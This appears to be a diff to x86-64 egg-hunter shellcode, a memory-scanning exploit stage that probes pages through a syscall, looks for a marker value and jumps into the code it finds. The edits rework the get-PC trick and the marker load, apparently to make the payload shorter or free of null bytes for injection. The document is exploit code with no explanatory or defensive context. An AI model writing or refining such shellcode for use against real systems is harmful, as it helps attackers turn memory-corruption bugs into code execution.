@@ -1,12 +1,17 @@
 global _start
 
+
 _start:
     xor rsi, rsi
-    call getpc
+    jmp getpc
 
-getpc:
+pop:
     pop rdi
     xor di, di
+    jmp next
+
+getpc:
+    call pop
 
 next:
     or di, 0xfff
@@ -18,9 +23,8 @@ hunt:
     syscall
     cmp al, 0xf2
     je next
-    push 0x41414140
-    pop rax
-    inc rax
+    mov eax, 0x41414140
+    inc al
     scasd
     jnz hunt
     jmp rdi
